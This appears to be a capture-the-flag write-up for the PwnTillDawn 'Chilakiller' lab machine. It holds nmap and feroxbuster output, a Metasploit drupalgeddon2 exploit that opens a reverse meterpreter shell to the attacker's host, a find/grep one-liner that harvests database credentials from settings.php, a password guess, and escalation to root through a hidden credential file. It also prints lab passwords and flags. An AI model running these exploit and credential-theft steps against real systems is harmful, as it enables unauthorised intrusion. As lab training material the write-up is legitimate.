---
categories: [PwnTillDawn]
tags: [Drupal, Hid&Trial, .config, Metasploit]
image:
  path: /Vulnhub-Files/img/Chilakiller/Untitled.png
  alt: Chilakiller -> https://www.wizlynxgroup.com/ , https://online.pwntilldawn.com/
---


## Port Scan Results ⤵️

```bash
┌──(kali㉿kali)-[~/Downloads/PwnTillDawn/10.150.150.182]
└─$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.150.150.182
[sudo] password for kali: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-19 15:07 IST
Stats: 0:03:16 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 13.11% done; ETC: 15:32 (0:21:46 remaining)
Nmap scan report for 10.150.150.182
Host is up (0.21s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 8e:0a:83:30:6b:a5:ef:12:81:4a:8e:66:c6:f4:22:12 (RSA)
|   256 ef:77:5e:a9:59:19:de:f8:c3:f3:1c:2e:73:09:8a:8f (ECDSA)
|_  256 b3:be:3b:05:0c:f7:62:24:ce:1b:5c:5b:df:cc:fc:23 (ED25519)
80/tcp   open  http       nginx 1.4.0 (Ubuntu)
|_http-title: Welcome to nginx!
|_http-server-header: nginx 1.4.0 (Ubuntu)
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Tue, 19 Sep 2023 10:30:36 GMT
|     Server: nginx 1.4.0 (Ubuntu)
|     Last-Modified: Sat, 01 Aug 2020 20:47:30 GMT
|     ETag: "264-5abd7039b3849"
|     Accept-Ranges: bytes
|     Content-Length: 612
|     Vary: Accept-Encoding
|     Connection: close
|     Content-Type: text/html
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <title>Welcome to nginx!</title>
|     <style>
|     body {
|     width: 35em;
|     margin: 0 auto;
|     font-family: Tahoma, Verdana, Arial, sans-serif;
|     </style>
|     </head>
|     <body>
|     <h1>Welcome to nginx!</h1>
|     <p>If you see this page, the nginx web server is successfully installed and
|     working. Further configuration is required.</p>
|     <p>For online documentation and support please refer to
|     href="http://nginx.org/">nginx.org</a>.<br/>
|     Commercial support is available at
|     href="http://nginx.com/">nginx.com</a>.</p>
|     <p><em>Thank you for using nginx.</em></p>
|     </body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Tue, 19 Sep 2023 10:30:36 GMT
|     Server: nginx 1.4.0 (Ubuntu)
|     Allow: HEAD,HEAD,GET,HEAD,POST,OPTIONS
|     Content-Length: 0
|     Connection: close
|     Content-Type: text/html
|   RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Date: Tue, 19 Sep 2023 10:30:37 GMT
|     Server: nginx 1.4.0 (Ubuntu)
|     Content-Length: 299
|     Connection: close
|     Content-Type: text/html; charset=iso-8859-1
|     <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
|     <html><head>
|     <title>400 Bad Request</title>
|     </head><body>
|     <h1>Bad Request</h1>
|     <p>Your browser sent a request that this server could not understand.<br />
|     </p>
|     <hr>
|     <address>nginx 1.4.0 (Ubuntu) Server at 127.0.1.1 Port 80</address>
|_    </body></html>
8080/tcp open  http-proxy nginx 1.4.0 (Ubuntu)
|_http-server-header: nginx 1.4.0 (Ubuntu)
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Welcome to nginx!
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Tue, 19 Sep 2023 10:30:36 GMT
|     Server: nginx 1.4.0 (Ubuntu)
|     Last-Modified: Sat, 01 Aug 2020 20:47:30 GMT
|     ETag: "264-5abd7039b3849"
|     Accept-Ranges: bytes
|     Content-Length: 612
|     Vary: Accept-Encoding
|     Connection: close
|     Content-Type: text/html
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <title>Welcome to nginx!</title>
|     <style>
|     body {
|     width: 35em;
|     margin: 0 auto;
|     font-family: Tahoma, Verdana, Arial, sans-serif;
|     </style>
|     </head>
|     <body>
|     <h1>Welcome to nginx!</h1>
|     <p>If you see this page, the nginx web server is successfully installed and
|     working. Further configuration is required.</p>
|     <p>For online documentation and support please refer to
|     href="http://nginx.org/">nginx.org</a>.<br/>
|     Commercial support is available at
|     href="http://nginx.com/">nginx.com</a>.</p>
|     <p><em>Thank you for using nginx.</em></p>
|     </body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Tue, 19 Sep 2023 10:30:36 GMT
|     Server: nginx 1.4.0 (Ubuntu)
|     Allow: HEAD,HEAD,GET,HEAD,POST,OPTIONS
|     Content-Length: 0
|     Connection: close
|     Content-Type: text/html
|   RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Date: Tue, 19 Sep 2023 10:30:37 GMT
|     Server: nginx 1.4.0 (Ubuntu)
|     Content-Length: 299
|     Connection: close
|     Content-Type: text/html; charset=iso-8859-1
|     <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
|     <html><head>
|     <title>400 Bad Request</title>
|     </head><body>
|     <h1>Bad Request</h1>
|     <p>Your browser sent a request that this server could not understand.<br />
|     </p>
|     <hr>
|     <address>nginx 1.4.0 (Ubuntu) Server at 127.0.1.1 Port 80</address>
|_    </body></html>
2 services unrecognized despite returning data.
```
{: .nolineno}

## Web Enumeration ⤵️

Lets check port 80 →

![Untitled](/Vulnhub-Files/img/Chilakiller/Untitled%201.png)

I got a nginx server runing so lets now see the directory traversal , first I couldn’t find anything than with different wordlists I got a hit and got a drupal site →

```bash
┌──(kali㉿kali)-[~/Downloads/PwnTillDawn/10.150.150.182]
└─$ feroxbuster -u http://10.150.150.182:80/ -w /usr/share/wordlists/dirb/big.txt -t 100 -x php,zip,log,txt -C 404,403,500 -o Ferox_80 --depth 1 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.150.150.182:80/
 🚀  Threads               │ 100
 📖  Wordlist              │ /usr/share/wordlists/dirb/big.txt
 💢  Status Code Filters   │ [404, 403, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💾  Output File           │ Ferox_80
 💲  Extensions            │ [php, zip, log, txt]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 1
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       29w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       32w      274c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       25l       69w      612c http://10.150.150.182/
301      GET        9l       29w      316c http://10.150.150.182/SiteMap => http://10.150.150.182/SiteMap/
301      GET        9l       29w      314c http://10.150.150.182/Sites => http://10.150.150.182/Sites/
301      GET        9l       29w      313c http://10.150.150.182/TEMP => http://10.150.150.182/TEMP/
301      GET        9l       29w      315c http://10.150.150.182/manual => http://10.150.150.182/manual/
301      GET        9l       29w      320c http://10.150.150.182/restaurante => http://10.150.150.182/restaurante/
301      GET        9l       29w      318c http://10.150.150.182/test-site => http://10.150.150.182/test-site/
[####################] - 7m    204750/204750  0s      found:7       errors:1316   
[####################] - 7m    102345/102345  253/s   http://10.150.150.182:80/ 
[####################] - 7m    102345/102345  254/s   http://10.150.150.182/
```
{: .nolineno}

Now in directory `/restaurante/` I got a drupal site →

![Untitled](/Vulnhub-Files/img/Chilakiller/Untitled%202.png)

Now I used the metasploit module for exploitation of drupal sites →

```bash
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > options

Module options (exploit/unix/webapp/drupal_drupalgeddon2):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   DUMP_OUTPUT  false            no        Dump payload command output
   PHP_FUNC     passthru         yes       PHP function to execute
   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS       10.150.150.182   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/us
                                           ing-metasploit.html
   RPORT        80               yes       The target port (TCP)
   SSL          false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI    /restaurante/    yes       Path to Drupal install
   subdomain                         no        HTTP server virtual host

Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.66.66.178     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Automatic (PHP In-Memory)

View the full module info with the info, or info -d command.

msf6 exploit(unix/webapp/drupal_drupalgeddon2) > run

[*] Started reverse TCP handler on 10.66.66.178:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Sending stage (39927 bytes) to 10.150.150.182
[*] Meterpreter session 1 opened (10.66.66.178:4444 -> 10.150.150.182:58574) at 2023-09-19 16:16:12 +0530

meterpreter > 
meterpreter > shell
Process 5624 created.
Channel 0 created.
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@chilakiller:/var/www/html/restaurante$
```
{: .nolineno}

Now lets dig deeper into the shell and get come credentials and for that I used this script →

```bash
find / -name settings.php -exec grep "drupal_hash_salt\|'database'\|'username'\|'password'\|'host'\|'port'\|'driver'\|'prefix'" {} \; 2>/dev/null
```
{: .nolineno}

I got this result ⤵️ 

```bash
*   'driver' => 'mysql',
 *   'database' => 'databasename',
 *   'username' => 'username',
 *   'password' => 'password',
 *   'host' => 'localhost',
 *   'port' => 3306,
 *   'prefix' => 'myprefix_',
 *   'driver' => 'mysql',
 *   'database' => 'databasename',
 *   'username' => 'username',
 *   'password' => 'password',
 *   'host' => 'localhost',
 *   'prefix' => 'main_',
 *   'driver' => 'mysql',
 *   'database' => 'databasename',
 *   'username' => 'username',
 *   'password' => 'password',
 *   'host' => 'localhost',
 * by using the 'prefix' setting. If a prefix is specified, the table
 * To have all database names prefixed, set 'prefix' as a string:
 *   'prefix' => 'main_',
 * To provide prefixes for specific tables, set 'prefix' as an array.
 *   'prefix' => array(
 *   'prefix' => array(
 *     'driver' => 'mysql',
 *     'database' => 'databasename',
 *     'username' => 'username',
 *     'password' => 'password',
 *     'host' => 'localhost',
 *     'prefix' => '',
 *     'driver' => 'pgsql',
 *     'database' => 'databasename',
 *     'username' => 'username',
 *     'password' => 'password',
 *     'host' => 'localhost',
 *     'prefix' => '',
 *     'driver' => 'sqlite',
 *     'database' => '/path/to/databasefilename',
      'database' => 'drupaldb',
      'username' => 'drupal',
      'password' => 'EstaContraNoesTanImp0rtant3!!!',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => 'ptd_',
 *   $drupal_hash_salt = file_get_contents('/home/example/salt.txt');
$drupal_hash_salt = 'EWlZLEj4s5rioclU2dTcU-_G1lMvzhVef2wm8NB0Fvk';
```
{: .nolineno}

Now I see a users on home directory →

```bash
www-data@chilakiller:/$ cd home
www-data@chilakiller:/home$ ls -al
total 12
drwxr-xr-x  3 root  root  4096 Jul 31  2020 .
drwxr-xr-x 23 root  root  4096 Jul 31  2020 ..
drwxr-x--- 11 user1 user1 4096 Sep 30  2021 user1
www-data@chilakiller:/home$
```
{: .nolineno}

Now I just hid and tried the user & password as same that is `user1:user1` and I got in ,

I was stuck for some time for that →

```bash
www-data@chilakiller:/home$ su user1
Password: 
user1@chilakiller:/home$ cd user1
user1@chilakiller:~$ ls -al
total 68
drwxr-x--- 11 user1 user1 4096 Sep 30  2021 .
drwxr-xr-x  3 root  root  4096 Jul 31  2020 ..
lrwxrwxrwx  1 user1 user1    9 Jul 31  2020 .bash_history -> /dev/null
-rw-r--r--  1 user1 user1  220 Jul 31  2020 .bash_logout
-rw-r--r--  1 user1 user1 3688 Aug  1  2020 .bashrc
drwx------ 12 user1 user1 4096 Apr 28  2021 .cache
drwx------ 13 user1 user1 4096 Aug  1  2020 .config
drwxr-xr-x  2 user1 user1 4096 Jul 31  2020 Desktop
drwxr-xr-x  2 user1 user1 4096 Aug  1  2020 Documents
-rw-------  1 user1 user1   41 Aug  4  2020 FLAG3.txt
drwx------  3 user1 user1 4096 Jul 31  2020 .gnupg
-rw-------  1 user1 user1 7022 Sep 30  2021 .ICEauthority
drwxr-xr-x  3 user1 user1 4096 Jul 31  2020 .local
drwx------  5 user1 user1 4096 Aug  4  2020 .mozilla
drwx------  3 user1 user1 4096 Aug  1  2020 .pki
-rw-r--r--  1 user1 user1  675 Jul 31  2020 .profile
drwx------  2 user1 user1 4096 Aug  1  2020 .ssh
user1@chilakiller:~$ cat FLAG3.txt 
9a8cda5f343e89e68aaec65f1df3c61ae5176a19
user1@chilakiller:~$
```
{: .nolineno}

Now for root access I searched for `.conf` files and I got these and the credentials for root →

```bash
user1@chilakiller:~$ find / -name ".conf*" 2>/dev/null
/etc/openvpn/client/.config
/home/user1/.config
/var/lib/gdm3/.config
user1@chilakiller:~$ cat /etc/openvpn/client/.config
cat: /etc/openvpn/client/.config: Is a directory
user1@chilakiller:~$ cd /etc/openvpn/client/.config
user1@chilakiller:/etc/openvpn/client/.config$ ls -al
total 12
drwxr-xr-x 2 root root 4096 Aug  1  2020 .
drwxr-xr-x 3 root root 4096 Aug  1  2020 ..
-rw-r----- 1 root ch     29 Aug  1  2020 .5OBdDQ80Py
user1@chilakiller:/etc/openvpn/client/.config$ cat .5OBdDQ80Py 
hUqJ2
ChilaKill3s_Tru3_L0v3R
user1@chilakiller:/etc/openvpn/client/.config$ su root
Password: 
root@chilakiller:/etc/openvpn/client/.config# whoami
root
root@chilakiller:/etc/openvpn/client/.config# id
uid=0(root) gid=0(root) groups=0(root),1001(ch)
root@chilakiller:/etc/openvpn/client/.config# cd /root
root@chilakiller:~# ls -al
total 36
drwx------  6 root root 4096 Apr 28  2021 .
drwxr-xr-x 23 root root 4096 Jul 31  2020 ..
lrwxrwxrwx  1 root root    9 Jul 31  2020 .bash_history -> /dev/null
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
drwx------  2 root root 4096 Jul 31  2020 .cache
drwxr-xr-x  6 root root 4096 Aug  1  2020 .config
-rw-------  1 root root   41 Aug  4  2020 FLAG2.txt
drwxr-xr-x  3 root root 4096 Aug  1  2020 .local
lrwxrwxrwx  1 root root    9 Aug  1  2020 .mysql_history -> /dev/null
drwxr-xr-x  2 root root 4096 Apr 28  2021 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
root@chilakiller:~# cat FLAG2.txt
ccc61a1d18a937cc3db531a5216a04a805d54762
root@chilakiller:~#
```
{: .nolineno}

I am root now !!